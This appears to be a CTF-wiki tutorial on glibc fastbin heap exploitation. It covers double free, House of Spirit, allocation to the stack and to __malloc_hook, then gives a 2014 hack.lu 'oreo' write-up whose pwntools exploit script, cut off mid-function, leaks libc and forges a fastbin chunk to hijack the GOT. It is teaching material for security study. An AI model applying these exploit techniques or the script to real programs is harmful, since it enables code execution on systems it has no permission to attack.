# Fastbin Attack

## Introduction
Fastbin attack is a class of vulnerability exploitation methods, referring to all exploitation techniques based on the fastbin mechanism. The prerequisites for this type of exploitation are:

* The existence of vulnerabilities such as heap overflow or use-after-free that can control chunk content
* The vulnerability occurs in chunks of the fastbin type

If we break it down further, we can classify them as follows:

- Fastbin Double Free
- House of Spirit
- Alloc to Stack
- Arbitrary Alloc

Among these, the first two mainly focus on using the `free` function to release **real chunks or forged chunks**, then requesting chunks again for the attack. The latter two focus on intentionally modifying the `fd` pointer to directly use `malloc` to request chunks at specified locations for the attack.

## Principle

The reason fastbin attack exists is that fastbin uses a singly linked list to manage freed heap chunks, and even when a chunk managed by fastbin is freed, the prev_inuse bit of its next_chunk is not cleared.
Let's look at how fastbin manages free chunks.
```
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x30);
    chunk2=malloc(0x30);
    chunk3=malloc(0x30);
    // perform free
    free(chunk1);
    free(chunk2);
    free(chunk3);
    return 0;
}
```
Before freeing:
```
0x602000:	0x0000000000000000	0x0000000000000041 <=== chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000041 <=== chunk2
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000041 <=== chunk3
0x602090:	0x0000000000000000	0x0000000000000000
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000020f41 <=== top chunk
```
After executing three free operations:
```
0x602000:	0x0000000000000000	0x0000000000000041 <=== chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000041 <=== chunk2
0x602050:	0x0000000000602000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000041 <=== chunk3
0x602090:	0x0000000000602040	0x0000000000000000
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000020f41 <=== top chunk
```
At this point, the fastbin linked list in main_arena already stores a pointer to chunk3, and chunks 3, 2, 1 form a singly linked list:
```
Fastbins[idx=2, size=0x30,ptr=0x602080]
===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
===>Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)
```


## Fastbin Double Free

### Introduction

Fastbin Double Free means that a fastbin chunk can be freed multiple times, so it can exist multiple times in the fastbin linked list. The consequence is that multiple allocations can retrieve the same heap chunk from the fastbin linked list, which is equivalent to having multiple pointers pointing to the same heap chunk. Combined with the data content of the heap chunk, this can achieve an effect similar to type confusion.

The successful exploitation of Fastbin Double Free is mainly due to two reasons:

1. After a fastbin chunk is freed, the pre_inuse bit of next_chunk is not cleared
2. When fastbin executes free, it only validates the chunk directly pointed to by main_arena, i.e., the chunk at the head of the linked list. Chunks further down the list are not validated.

```
/* Another simple check: make sure the top of the bin is not the
	   record we are going to add (i.e., double free).  */
	if (__builtin_expect (old == p, 0))
	  {
	    errstr = "double free or corruption (fasttop)";
	    goto errout;
}
```

### Demonstration
The following example program illustrates this point. When we try to execute the following code:

```
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk1);
    return 0;
}
```
If you run this program, you will most likely get the following result, which is the _int_free function detecting a fastbin double free.
```
*** Error in `./tst': double free or corruption (fasttop): 0x0000000002200010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]
./tst[0x4005a2]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]
./tst[0x400499]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
02200000-02221000 rw-p 00000000 00:00 0                                  [heap]
7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0
7fbb74021000-7fbb78000000 ---p 00000000 00:00 0
7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0
7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0
7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0
7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0
7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]
7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]
7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
Aborted (core dumped)
```
If we free chunk2 after freeing chunk1, then main_arena will point to chunk2 instead of chunk1. At this point, if we free chunk1 again, it will no longer be detected.
```
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
```
First free `free(chunk1)`:

![](./figure/fastbin_free_chunk1.png)

Second free `free(chunk2)`:

![](./figure/fastbin_free_chunk2.png)

Third free `free(chunk1)`:



![](./figure/fastbin_free_chunk3.png)


Note that since chunk1 is freed again, its fd value is no longer 0 but points to chunk2. At this point, if we can control the content of chunk1, we can write to its fd pointer to achieve allocation of fastbin chunks at any arbitrary address we want.
The following example demonstrates this. First, as before, we construct the linked list main_arena=>chunk1=>chunk2=>chunk1. After the first malloc call returns chunk1, we modify chunk1's fd pointer to point to bss_chunk on the bss segment. We can then see that fastbin will allocate a heap chunk there.

```
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;

    bss_chunk.size=0x21;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    chunk_a=malloc(0x10);
    *(long long *)chunk_a=&bss_chunk;
    malloc(0x10);
    malloc(0x10);
    chunk_b=malloc(0x10);
    printf("%p",chunk_b);
    return 0;
}
```
On my system, chunk_b outputs the value 0x601090, which is located in the bss segment and is exactly the `CHUNK bss_chunk` we set up earlier.
```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

0x601080 <bss_chunk>:	0x0000000000000000	0x0000000000000021
0x601090 <bss_chunk+16>:0x0000000000000000	0x0000000000000000
0x6010a0:	            0x0000000000000000	0x0000000000000000
0x6010b0:	            0x0000000000000000	0x0000000000000000
0x6010c0:	            0x0000000000000000	0x0000000000000000
```
It is worth noting that we performed `bss_chunk.size=0x21;` in the very first step of the main function. This is because _int_malloc validates the size field of the intended allocation location. If its size does not match the expected size for the current fastbin linked list, an exception is thrown.
```
*** Error in `./tst': malloc(): memory corruption (fast): 0x0000000000601090 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]
./tst[0x400636]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]
./tst[0x4004e9]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]
7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0
7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0
7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0
7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0
7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0
7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0
7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]
7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]
7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
Aborted (core dumped)
```
The check in _int_malloc is as follows:
```
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
	{
	  errstr = "malloc(): memory corruption (fast)";
	errout:
	  malloc_printerr (check_action, errstr, chunk2mem (victim));
	  return NULL;
}
```

### Summary
Through fastbin double free, we can use multiple pointers to control the same heap chunk. This can be used to tamper with key data fields in heap chunks or to achieve an effect similar to type confusion.
If we go further and modify the fd pointer, we can achieve the effect of allocating heap chunks at arbitrary addresses (provided it passes validation), which is essentially equivalent to arbitrary address write with arbitrary values.

## House Of Spirit

### Introduction

House of Spirit is a technique from `the Malloc Maleficarum`.

The core of this technique is to forge a fastbin chunk at the target location and free it, thereby achieving the goal of allocating a chunk at a **specified address**.

To construct a fastbin fake chunk and have it placed into the corresponding fastbin linked list when freed, several necessary checks must be bypassed:

- The fake chunk's ISMMAP bit must not be 1, because if the chunk is mmap'd during free, it will be handled separately.
- The fake chunk address must be aligned, MALLOC_ALIGN_MASK.
- The fake chunk's size must satisfy the corresponding fastbin requirements and also be aligned.
- The fake chunk's next chunk size must not be smaller than `2 * SIZE_SZ` and must not be larger than `av->system_mem`.
- The head of the fastbin linked list corresponding to the fake chunk must not be the fake chunk itself, i.e., it must not create a double free situation.

As for why these checks need to be bypassed, refer to the source code of the free section.

### Demonstration

Here we directly use the example from how2heap for explanation, as follows:

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
	unsigned long long *a;
	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

	fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);

	fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size

	fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
	fake_chunks[9] = 0x1234; // nextsize

	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
	a = &fake_chunks[2];

	fprintf(stderr, "Freeing the overwritten pointer.\n");
	free(a);

	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

The output after running is as follows:

```shell
➜  how2heap git:(master) ./house_of_spirit
This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake 'fastbin' region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.
This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!
malloc(0x30): 0x7ffd9bceaa60
```

### Summary

As we can see, to use this technique to allocate a chunk at a specified address, we don't actually need to modify any content at the specified address. **The key is being able to modify the content before and after the specified address so that it can bypass the corresponding checks.**

## Alloc to Stack

### Introduction

If you have already understood the Fastbin Double Free and House of Spirit techniques described above, then understanding this technique should not be a problem. Their essence lies in the characteristics of the fastbin linked list: the fd pointer of the current chunk points to the next chunk.

The core of this technique is to hijack the fd pointer of a chunk in the fastbin linked list, making it point to the stack where we want to allocate, thereby achieving control over some key data on the stack, such as the return address.

### Demonstration
This time we place the fake_chunk on the stack and call it stack_chunk. We also hijack the fd value of a chunk in the fastbin linked list. By pointing this fd value to stack_chunk, we can allocate a fastbin chunk on the stack.
```
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;

    void *chunk1;
    void *chunk_a;

    stack_chunk.size=0x21;
    chunk1=malloc(0x10);

    free(chunk1);

    *(long long *)chunk1=&stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
```
By debugging with gdb, we can see that we first made chunk1's fd pointer point to stack_chunk:
```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1
0x602010:	0x00007fffffffde60	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 <=== top chunk
```
After the first malloc, the fastbin linked list points to stack_chunk, which means the next allocation will use stack_chunk's memory:
```
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000 <=== unsorted bin
0x7ffff7dd1b28 <main_arena+8>:  0x00007fffffffde60 <=== fastbin[0]
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000
```
Finally, the second malloc returns 0x00007fffffffde70, which is stack_chunk:
```
   0x400629 <main+83>        call   0x4004c0 <malloc@plt>
 → 0x40062e <main+88>        mov    QWORD PTR [rbp-0x38], rax
   $rax   : 0x00007fffffffde70

0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]

```


### Summary
Through this technique, we can allocate a fastbin chunk to the stack, thereby controlling key data such as the return address. To achieve this, we need to hijack the fd field of a chunk in fastbin and point it to the stack. Of course, there also needs to be a size value on the stack that satisfies the conditions.

## Arbitrary Alloc

### Introduction

Arbitrary Alloc is essentially identical to Alloc to Stack; the only difference is that the allocation target is no longer on the stack.
In fact, as long as a valid size field exists at the target address (whether constructed or naturally occurring), we can allocate a chunk to any writable memory, such as bss, heap, data, stack, etc.

### Demonstration
In this example, we use byte misalignment to achieve direct allocation of a fastbin to the location of **\_malloc_hook, essentially overwriting _malloc_hook to control program flow.**
```
int main(void)
{


    void *chunk1;
    void *chunk_a;

    chunk1=malloc(0x60);

    free(chunk1);

    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
    malloc(0x60);
    chunk_a=malloc(0x60);
    return 0;
}
```
Here 0x7ffff7dd1af5 is a value derived from my local machine. How is this value obtained? First, we need to observe whether byte misalignment is possible near the address we want to write to.
```
0x7ffff7dd1a88 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1a90 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1a98 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1aa0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1aa8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ab0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ab8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ac0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ac8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ad0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ad8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ae0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ae8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1af0 0x60 0x2	0xdd 0xf7 0xff 0x7f	0x0	0x0
0x7ffff7dd1af8 0x0  0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1b00 0x20	0x2e 0xa9 0xf7 0xff	0x7f 0x0 0x0
0x7ffff7dd1b08 0x0	0x2a 0xa9 0xf7 0xff	0x7f 0x0 0x0
0x7ffff7dd1b10 <__malloc_hook>:	0x30	0x28	0xa9	0xf7	0xff	0x7f	0x0	0x0
```
0x7ffff7dd1b10 is the address of __malloc_hook that we want to control. So we search upward to see if we can misalign to produce a valid size field. Since this program is 64-bit, the fastbin range is from 32 bytes to 128 bytes (0x20-0x80), as shown below:
```
// The size here refers to the user region, so it should be 2*SIZE_SZ smaller
Fastbins[idx=0, size=0x10]
Fastbins[idx=1, size=0x20]
Fastbins[idx=2, size=0x30]
Fastbins[idx=3, size=0x40]
Fastbins[idx=4, size=0x50]
Fastbins[idx=5, size=0x60]
Fastbins[idx=6, size=0x70]
```
Through observation, we find that at 0x7ffff7dd1af5 we can actually construct a misaligned 0x000000000000007f:
```
0x7ffff7dd1af0 0x60 0x2	0xdd 0xf7 0xff 0x7f	0x0	0x0
0x7ffff7dd1af8 0x0  0x0	0x0	0x0	0x0	0x0	0x0	0x0

0x7ffff7dd1af5 <_IO_wide_data_0+309>:	0x000000000000007f
```
Because 0x7f falls into index 5 when calculating the fastbin index, which corresponds to a chunk size of 0x70.

```c
##define fastbin_index(sz)                                                      \
    ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```
(Note that sz is of type unsigned int, so it only occupies 4 bytes)


Since its size also includes the 0x10 chunk_header, we choose to allocate a 0x60 fastbin and add it to the linked list.
Finally, after two allocations, we can observe that the chunk is allocated at 0x7ffff7dd1afd. Therefore, we can directly control the content of __malloc_hook (in my libc, __realloc_hook and __malloc_hook are adjacent to each other).

```
0x4005a8 <main+66>        call   0x400450 <malloc@plt>
 →   0x4005ad <main+71>        mov    QWORD PTR [rbp-0x8], rax

 $rax   : 0x7ffff7dd1afd

0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	0xfff7a92e20000000	0xfff7a92a0000007f
0x7ffff7dd1b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000

```


### Summary
Arbitrary Alloc is used even more frequently in CTF competitions. We can use byte misalignment and other methods to bypass the size field check, achieving chunk allocation at arbitrary addresses. The final effect is essentially equivalent to writing arbitrary values at arbitrary addresses.

## 2014 hack.lu oreo
[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2014_hack.lu_oreo)

### Basic Analysis

```shell
➜  2014_Hack.lu_oreo git:(master) file oreo
oreo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f591eececd05c63140b9d658578aea6c24450f8b, stripped
➜  2014_Hack.lu_oreo git:(master) checksec oreo
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

As we can see, the program is indeed quite old — a 32-bit, dynamically linked binary, and it doesn't even have RELRO enabled.

### Basic Functionality

**It should be noted that this program does not perform a setvbuf operation, so when an I/O function is first executed, space will be allocated on the heap.**

As directly indicated by the program's output, the program is primarily a primitive online rifle system. Based on the process of adding rifles, we can derive the basic structure of a rifle as follows:

```c
00000000 rifle           struc ; (sizeof=0x38, mappedto_5)
00000000 descript        db 25 dup(?)
00000019 name            db 27 dup(?)
00000034 next            dd ?                    ; offset
00000038 rifle           ends
```

The basic functions of the program are:

- Add a rifle: It mainly reads the rifle's name and description. The problem is that the name read length is too long, which can overwrite the next pointer and data of subsequent heap chunks. The overwritable data size of subsequent heap chunks is 56-(56-27)=27 bytes. Note that all these rifles are within the fastbin size range.
- Show added rifles: Output the description and name of rifles from head to tail.
- Order the selected rifles: Free all added rifles, but the pointers are not set to NULL.
- Leave an order message.
- Show current status: Display how many rifles have been added, how many orders have been placed, and what message was left.

It is easy to see that the main vulnerability in the program is the heap overflow when adding rifles.

### Exploitation

The basic exploitation approach is as follows:

1. Since the program has a heap overflow vulnerability and can also control the next pointer, we can directly make the next pointer point to a GOT table entry in the program. When displaying, the corresponding content can be output. At the same time, we need to ensure that when the corresponding address is treated as a rifle structure, its next pointer is NULL. Here I use puts@got. Through this operation, we can obtain the libc base address and the system function address.
2. Since the rifle structure size is 0x38, its corresponding chunk is 0x40. Here we use the `house of spirit` technique to return a chunk at 0x0804A2A8, which is the pointer to the message left behind. Therefore, we need to set the content at 0x0804A2A4 to 0x40, which means we need to add 0x40 rifles to bypass the size check. At the same time, to ensure we can bypass the next chunk check, we edit the message left behind.
3. After successfully allocating such a chunk, we essentially have an arbitrary address modification vulnerability. Here we can choose to modify an appropriate GOT entry to the system address to obtain a shell.

The specific code is as follows:

```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./oreo"
oreo = ELF("./oreo")
if args['REMOTE']:
    p = remote(ip, port)
else:
    p = process("./oreo")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')


def add(descrip, name):
    p.sendline('1')
    #p.recvuntil('Rifle name: ')
    p.sendline(name)
    #p.recvuntil('Rifle description: ')
    #sleep(0.5)
    p.sendline(descrip)


def show_rifle():
    p.sendline('2')
    p.recvuntil('===================================\n')


def order():
    p.sendline('3')


def message(notice):
    p.sendline('4')
    #p.recvuntil("Enter any notice you'd like to submit with your order: ")
    p.sendline(notice)


def exp():
    print 'step 1. leak libc base'
    name = 27 * 'a' + p32(oreo.got['puts'])
    add(25 * 'a', name)
    show_rifle()
    p.recvuntil('===================================\n')
    p.recvuntil('Description: ')
    puts_addr = u32(p.recvuntil('\n', drop=True)[:4])
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))

    print 'step 2. free fake chunk at 0x0804A2A8'

    # now, oifle_cnt=1, we need set it = 0x40
    oifle = 1
    while oifle < 0x3f:
        # set next link=NULL
        add(25 * 'a', 'a' * 27 + p32(0))
        oifle += 1
    payload = 'a' * 27 + p32(0x0804a2a8)
    # set next link=0x0804A2A8, try to free a fake chunk
    add(25 * 'a', payload)
    # before free, we need to bypass some check
    # fake chunk's size is 0x40
    # 0x20 *'a' for padding the last fake chunk
    # 0x40 for fake chunk's next chunk's prev_size
    # 0x100 for fake chunk's next chunk's size
    # set fake iofle' next to be NULL
    payload = 0x20 * '\x00' + p32(0x40) + p32(0x100)
    payload = payload.ljust(52, 'b')
    payload += p32(0)
    payload = payload.ljust(128, 'c')
    message(payload)
    # fastbin 0x40: 0x0804A2A0->some where heap->NULL
    order()
    p.recvuntil('Okay order submitted!\n')

